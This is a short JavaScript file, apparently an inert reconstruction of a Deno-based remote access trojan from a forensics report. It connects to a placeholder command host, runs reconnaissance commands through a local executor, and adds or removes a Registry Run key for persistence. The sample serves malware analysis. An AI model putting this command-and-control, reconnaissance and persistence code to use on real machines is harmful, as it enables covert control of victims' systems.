// Inert static sample reconstructed from DFIR.ch "Anatomy of a Deno-Based Proxy & RAT".
// SHA-256 in report for original back.js: 9469268c421b7821f897deb2d4d2316b21ff5da35bef417aa4e284010ef78302
const connection = new WebSocket("wss://control.example.invalid/socket");
const executor = "http://127.0.0.1:34567/exec";

connection.onopen = async () => {
  await fetch(executor, {
    method: "POST",
    body: JSON.stringify({ command: "set && ipconfig /all && route print && tasklist" }),
  });
};

async function installPersistence(denoPath, workingDirectory) {
  const command =
    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v ExampleEntry /t REG_SZ /d "conhost.exe --headless ' +
    denoPath +
    ' --allow-run ' +
    workingDirectory +
    'launcher.js" /f';
  return fetch(executor, {
    method: "POST",
    body: JSON.stringify({ command }),
  });
}

async function removePersistence() {
  return fetch(executor, {
    method: "POST",
    body: JSON.stringify({
      command: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v ExampleEntry /f',
    }),
  });
}
